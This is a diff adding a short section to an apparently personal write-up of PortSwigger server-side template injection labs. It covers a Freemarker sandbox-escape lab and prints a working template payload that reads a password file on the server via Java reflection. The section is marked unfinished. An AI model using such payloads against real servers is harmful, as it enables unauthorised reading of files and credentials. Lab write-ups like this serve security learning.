@@ -109,3 +109,18 @@ I can then use this payload to extract the key to solve the lab:
 
 ![](../../.gitbook/assets/portswigger-ssti-writeup-image-11.png)
 
+## Lab 6: Sandboxed Environment
+
+This lab uses the Freemarker template engine. To solve the lab, read `/home/carlos/my_password.txt`. This lab gives us `content-manager` access.
+
+{% embed url="https://portswigger.net/research/server-side-template-injection" %}
+
+This is the payload they used:
+
+```java
+${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
+```
+
+![](../../.gitbook/assets/portswigger-ssti-writeup-image-12.png)
+
+Converting this to ASCII and submitting that solves the lab. I will dive into this exploit...another time. WIP!
